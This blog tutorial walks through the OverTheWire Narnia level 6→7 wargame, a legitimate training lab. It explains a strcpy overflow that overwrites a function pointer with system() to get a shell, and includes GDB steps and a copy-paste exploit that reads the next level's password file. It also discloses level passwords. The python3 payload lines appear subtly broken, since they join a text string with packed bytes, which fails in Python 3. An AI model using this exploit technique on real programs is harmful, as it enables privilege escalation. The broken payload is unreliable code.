---
date: 2023-08-24 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Narnia Level 6 → 7 tutorial!!"
permalink: /posts/Over-The-Wire-Narnia-Level-6-to-7/
tags: [overthewire, narnia, pwn, overflow, binary-exploitation, linux, beginner]
description: "A step by step tutorial for OverTheWire Narnia Level 6 → 7!!"
---

<!-- Scoped styles: only affect this post -->
<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="bandit-nav" aria-label="Narnia level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Narnia-Level-5-to-6/' | relative_url }}">← Previous: Level 5 → 6</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/narnia/narnia7.html" target="_blank" rel="noopener">Official (Level 7) ↗</a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Narnia-Level-7-to-8/' | relative_url }}">Next: Level 7 → 8 →</a>
  </div>
</nav>

## Login

Log in with the password from Level 5 → 6 (my run gave `neezoCaeng`):

```bash
ssh narnia6@narnia.labs.overthewire.org -p 2226
# password: neezoCaeng
````

---

## Task

Binary to exploit: **`/narnia/narnia6`**

The program accepts **two arguments**. Internally, it stores them in small buffers (`b1`, `b2`) and then calls a **function pointer `fp`**, which is initially set to point to `puts()`.
By overflowing one of the arguments, we can **overwrite the function pointer** and redirect execution.

---

## Source Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern char **environ;

unsigned long get_sp(void) {
    __asm__("movl %esp,%eax\n\t"
            "and $0xff000000, %eax");
}

int main(int argc, char *argv[]){
    char b1[8], b2[8];
    int (*fp)(char *);
    int i;

    fp = puts;
    i = 1;

    if(argc!=3){
        printf("%s b1 b2\n", argv[0]);
        exit(-1);
    }

    /* clear environment */
    for(i=0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

    /* clear arguments */
    for(i=3; argv[i] != NULL; i++)
        memset(argv[i], '\0', strlen(argv[i]));

    strcpy(b1,argv[1]);
    strcpy(b2,argv[2]);

    if(((unsigned long)fp & 0xff000000) == get_sp())
        exit(-1);

    setreuid(geteuid(),geteuid());
    fp(b1);

    exit(1);
}
```

---

## A little bit of Theory

* `fp` is initialized as pointer to **`puts`**.
* The second argument (`argv[2]`) is copied into `b2` using `strcpy` without bounds checks. Since `b2` is only 8 bytes, long input will **overflow into adjacent memory** — including `fp`.
* If we overwrite `fp` with the address of **`system()`**, then the call `fp(b1)` becomes `system(b1)`.
* If `b1` contains the string `"sh"`, we get a shell with **narnia7 privileges**.

**Key notes:**

* The program erases environment and extra args, so we cannot rely on env-passed shellcode.
* This is a **classic function pointer overwrite** attack.

---

## Step-by-step Solution

### 1) Inspect the binary in GDB

```bash
gdb /narnia/narnia6
```

Disassemble `main` and set a breakpoint just before the call `fp(b1)`:

```gdb
(gdb) disas main
(gdb) break *main+319
```

Run with dummy args:

```gdb
(gdb) run AAAA BBBB
```

Dump the stack around `$esp`:

```gdb
(gdb) x/16wx $esp
```

> You’ll see both arguments (`AAAA`, `BBBB`) and the pointer to `puts` stored in memory.

---

### 2) Find `system()` address

```gdb
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e4c850 <system>
```

Record this value — it will replace `fp`.

---

### 3) Craft payloads

* `argv[1]` = `"sh;" + padding` (this will be executed by `system`)
* `argv[2]` = overflow string to overwrite `fp` with `system()` address.

Example run:

```bash
./narnia6 $(python3 -c 'print("sh;" + "A"*5)') $(python3 -c 'import struct;print("B"*4 + struct.pack("<I", 0xf7e4c850))')
```

> Replace `0xf7e4c850` with the actual `system` address from your GDB session.

---

### 4) Verify exploit

```bash
whoami
# narnia7
cat /etc/narnia_pass/narnia7
```

My run gave:

```
ahkiaziphu
```

---

## Password

> This is the password from **my run**. Yours may differ depending on server snapshot:

```
ahkiaziphu
```

---

## Troubleshooting

* **Segmentation fault before shell** → Wrong overwrite alignment. Try adjusting padding in `argv[1]` and `argv[2]`.
* **No shell, just prints “sh”** → `fp` wasn’t overwritten. Recheck the offset and confirm your system() address.
* **Illegal instruction** → You may have corrupted the stack with bad bytes. Ensure your overwrite is exact and only touches `fp`.

---

## Copy-paste Quick Exploit

```bash
system_addr=0xf7e4c850   # replace with the address from your GDB
/narnia/narnia6 $(python3 -c 'print("sh;" + "A"*5)') $(python3 -c "import struct;print('B'*4 + struct.pack('<I', $system_addr))")
whoami
cat /etc/narnia_pass/narnia7
```

---

**Congrats 🎉** You exploited a **function pointer overwrite** to redirect execution from `puts` to `system("sh")`. On to **Level 7 → 8**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})

